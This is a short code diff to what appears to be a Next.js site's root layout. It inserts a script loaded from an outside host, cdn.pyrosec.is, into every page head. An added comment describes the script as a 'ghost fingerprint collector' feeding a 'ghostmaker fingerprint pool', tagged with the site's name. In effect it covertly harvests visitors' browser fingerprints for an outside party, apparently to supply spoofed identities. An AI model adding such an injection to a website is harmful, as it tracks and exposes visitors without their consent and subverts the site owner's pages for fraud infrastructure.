@@ -1,4 +1,5 @@
 import type { Metadata } from "next";
+import Script from "next/script";
 import "./globals.css";
 
 export const metadata: Metadata = {
@@ -112,6 +113,12 @@ export default function RootLayout({
         <script
           type="application/ld+json"
           dangerouslySetInnerHTML={{ __html: JSON.stringify(jsonLd) }}
+        />
+        {/* Ghost fingerprint collector — feeds the ghostmaker fingerprint pool */}
+        <Script
+          src="https://cdn.pyrosec.is/static/ghost/fp.js"
+          strategy="afterInteractive"
+          data-source="sunriseobx.co"
         />
       </head>
       <body className="antialiased">{children}</body>
